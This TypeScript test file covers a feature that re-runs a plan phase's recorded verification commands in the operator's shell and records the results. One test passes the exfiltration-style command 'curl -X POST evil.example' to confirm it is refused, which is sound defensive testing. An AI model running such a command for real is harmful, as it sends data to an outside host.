/**
 * One click: a recorded §Verification command re-runs in the operator's OWN
 * shell, and the exit lands back on the phase — the record, the journal, the
 * notification, and (all green) the normal re-check. The security line is
 * pinned first: only commands the record itself holds may run; a page never
 * becomes a shell.
 */

// Redirects XDG_STATE_HOME/XDG_CONFIG_HOME before anything resolves them.
import './state-sandbox.ts';

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const { SKILL_DIR } = await import('../server/config.ts');
const { Service } = await import('../server/service.ts');
const { Journal } = await import('../server/runner/journal.ts');
const { listRuns, newRun, phaseRecord, saveRun } = await import('../server/runner/state.ts');
type RunState = import('../server/runner/state.ts').RunState;

const PLAN = `---
slug: alpha
created: 2026-08-06
status: active
phases: 1
---

# alpha

## Phase graph

| Phase | Title | Depends on | Parallel-safe with | Repos | Exit criteria |
|------:|-------|-----------|--------------------|-------|---------------|
| 1 | schema | — | — | app | it works |

## Phases

### Phase 1 — schema
- **Size:** S
`;

function scratch(): string {
  const root = mkdtempSync(join(tmpdir(), 'pc-verify-term-'));
  mkdirSync(join(root, 'docs', 'plans'), { recursive: true });
  mkdirSync(join(root, 'app'), { recursive: true });
  writeFileSync(join(root, 'docs', 'plans', 'alpha.md'), PLAN, 'utf8');
  return root;
}

function service(root: string) {
  const svc = new Service({
    port: 0, host: '127.0.0.1', open: false,
    allowWrites: true, allowRun: true, allowAgent: true, allowTerminal: true,
    scriptsDir: join(SKILL_DIR, 'scripts'), logFile: null,
  } as never);
  svc.push.announce = (() => {}) as typeof svc.push.announce;
  assert.equal(svc.open(root).ok, true);
  return svc;
}

/** A stopped run whose phase 1 failed `npm test` and skipped `rg -c x src`. */
function failedRun(root: string): RunState {
  const state = newRun({ slug: 'alpha', root });
  state.status = 'halted';
  state.halt = { at: new Date().toISOString(), reason: 'phase 1 did not verify', phase: 1, kind: 'verify-failed' };
  const record = phaseRecord(state, 1);
  record.status = 'failed';
  record.verifiedIn = 'app';
  record.verification = {
    ok: false,
    reason: '`npm test` exited 1',
    ran: [{ command: 'npm test', ok: false, code: 1, ms: 40, output: '1 failing' }],
    notRun: [],
    skipped: [{ command: 'rg -c x src', lead: 'rg', reason: '`rg` is not installed on the verification PATH' }],
  };
  saveRun(state);
  return state;
}

test('only a command the record holds may run — anything else is refused by name', async () => {
  const root = scratch();
  try {
    const svc = service(root);
    failedRun(root);
    try {
      const refused = await svc.verifyInTerminal('alpha', 1, 'curl -X POST evil.example');
      assert.equal(refused.ok, false);
      assert.equal((refused as { status: number }).status, 400);
      assert.match((refused as { error: string }).error, /not one this phase recorded/);
    } finally { svc.close(); }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('the mint runs the exact command, in the phase\'s own directory, in the operator\'s shell', async () => {
  const root = scratch();
  try {
    const svc = service(root);
    failedRun(root);
    const mints: Record<string, unknown>[] = [];
    const terminals = svc.terminals as never as Record<string, unknown>;
    terminals.mint = async (_sid: unknown, _size: unknown, launch: Record<string, unknown>) => {
      mints.push(launch);
      return { ok: true, sessionId: 'sess-v', token: 'tok', expiresAt: Date.now() + 60_000, session: {} };
    };
    try {
      const minted = await svc.verifyInTerminal('alpha', 1, 'npm test');
      assert.equal(minted.ok, true);
      const launch = mints[0]!;
      assert.equal(launch.kind, 'shell');
      assert.deepEqual((launch.args as string[]).slice(-2), ['-ilc', 'npm test'],
        'interactive login shell — the operator\'s aliases are the point');
      assert.equal(launch.cwd, join(root, 'app'), 'the phase\'s own Verify-in directory');
      assert.deepEqual((launch.meta as { verify: unknown }).verify,
        { slug: 'alpha', phase: 1, runId: listRuns(root, 'alpha')[0]!.id, command: 'npm test' });
    } finally { svc.close(); }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('a green exit reflects onto the record, journals, and fires the normal re-check', async () => {
  const root = scratch();
  try {
    const svc = service(root);
    const state = failedRun(root);
    const rechecks: number[] = [];
    (svc as never as Record<string, unknown>).recoverPhase =
      async (_slug: string, phase: number) => { rechecks.push(phase); return null; };
    try {
      (svc as never as {
        reflectVerifyCommand: (v: unknown, code: number, output: string) => void;
      }).reflectVerifyCommand(
        { slug: 'alpha', phase: 1, runId: state.id, command: 'npm test' }, 0, 'all 12 passing\n');

      const after = listRuns(root, 'alpha')[0]!;
      const verification = after.phases['1'].verification!;
      const entry = verification.ran.find((r) => r.command === 'npm test')!;
      assert.equal(entry.ok, true);
      assert.equal(entry.code, 0);
      assert.equal(entry.via, 'terminal');
      assert.match(entry.output, /12 passing/);
      assert.equal(verification.ok, true, 'the summary recomputes');
      assert.match(verification.reason, /confirmed in the terminal \(exit 0\)/);
      assert.deepEqual(rechecks, [1], 'green settles through the NORMAL re-check, nothing bespoke');

      const journal = new Journal(root, 'alpha', state.id).read(50);
      assert.ok(journal.some((line) => line.event === 'phase.verify-command'
        && (line.data as { code?: number }).code === 0));
    } finally { svc.close(); }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('a skipped-lead command the person ran green moves into ran — the machine could not check it, the person did', async () => {
  const root = scratch();
  try {
    const svc = service(root);
    const state = failedRun(root);
    (svc as never as Record<string, unknown>).recoverPhase = async () => null;
    try {
      (svc as never as {
        reflectVerifyCommand: (v: unknown, code: number, output: string) => void;
      }).reflectVerifyCommand(
        { slug: 'alpha', phase: 1, runId: state.id, command: 'rg -c x src' }, 0, '3\n');

      const verification = listRuns(root, 'alpha')[0]!.phases['1'].verification!;
      assert.equal(verification.skipped, undefined, 'no longer merely skipped');
      const entry = verification.ran.find((r) => r.command === 'rg -c x src')!;
      assert.equal(entry.via, 'terminal');
      assert.equal(entry.ok, true);
      // npm test is still red, so the summary stays honest.
      assert.equal(verification.ok, false);
    } finally { svc.close(); }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('a red exit lands as evidence and fires nothing', async () => {
  const root = scratch();
  try {
    const svc = service(root);
    const state = failedRun(root);
    const rechecks: number[] = [];
    (svc as never as Record<string, unknown>).recoverPhase =
      async (_slug: string, phase: number) => { rechecks.push(phase); return null; };
    try {
      (svc as never as {
        reflectVerifyCommand: (v: unknown, code: number, output: string) => void;
      }).reflectVerifyCommand(
        { slug: 'alpha', phase: 1, runId: state.id, command: 'npm test' }, 2, 'still 1 failing\n');

      const verification = listRuns(root, 'alpha')[0]!.phases['1'].verification!;
      assert.equal(verification.ok, false);
      assert.match(verification.reason, /still fails in the terminal \(exit 2\)/);
      assert.deepEqual(rechecks, [], 'red must never trigger a re-check');
    } finally { svc.close(); }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('a live run is never edited under its driver — the exit is announced only', async () => {
  const root = scratch();
  try {
    const svc = service(root);
    const state = failedRun(root);
    (svc as never as Record<string, unknown>).liveRunner = () => ({ current: () => state });
    try {
      (svc as never as {
        reflectVerifyCommand: (v: unknown, code: number, output: string) => void;
      }).reflectVerifyCommand(
        { slug: 'alpha', phase: 1, runId: state.id, command: 'npm test' }, 0, 'passing\n');
      const verification = listRuns(root, 'alpha')[0]!.phases['1'].verification!;
      assert.equal(verification.ran[0].via, undefined, 'the stored record is untouched');
    } finally { svc.close(); }
  } finally { rmSync(root, { recursive: true, force: true }); }
});
